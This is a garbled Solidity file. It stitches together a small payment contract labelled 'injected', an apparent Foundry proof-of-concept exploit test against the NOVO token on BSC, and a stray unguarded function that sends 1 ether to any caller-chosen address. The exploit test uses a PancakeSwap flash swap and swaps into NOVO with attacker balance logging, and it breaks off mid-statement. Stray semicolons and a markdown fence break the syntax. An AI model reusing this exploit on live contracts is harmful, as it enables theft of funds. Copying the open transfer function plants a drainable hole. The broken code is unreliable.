
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
interface INOVOLP {
  function sync() external};
contract ContractTest is DSTest {
  IPancakePair PancakePair =;
    IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);
  IPancakeRouter PancakeRouter =;
    IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
  INOVOLP novoLP = INOVOLP(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("bsc", 18225002)};
  function testExploit() public {
    wbnb.deposit{ value: 10 * 1e18 }();
    emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit",
      wbnb.balanceOf(address(this)),;
      18);
    bytes memory data = abi.encode(0xEeBc161437FA948AAb99383142564160c92D2974,
      172 * 1e17);
    PancakePair.swap(0, 172 * 1e17, address(this), data);
    emit log_named_decimal_uint("[End] After repay, WBNB balance of attacker",
      wbnb.balanceOf(address(this)),;
      18)};
  function pancakeCall(address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data) public {
    address[] memory path = new address[](2);
    emit log_named_decimal_uint("[*] Attacker flashswap Borrow WBNB",
      amount1,
      18);
    emit log_string("[*] Attacker going swap some NOVO...");
    wbnb.approve(address(PancakeRouter), type(uint256).max);
    path[0] = address(wbnb);
    path[1] = address(novo);
    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(172 * 1e17,
      1,
      path,
      address(this),;
      block.timestamp);
    require(novo.balanceOf(address(
function replayableTransfer1(address to) public {
    payable(to).transfer(1 ether)}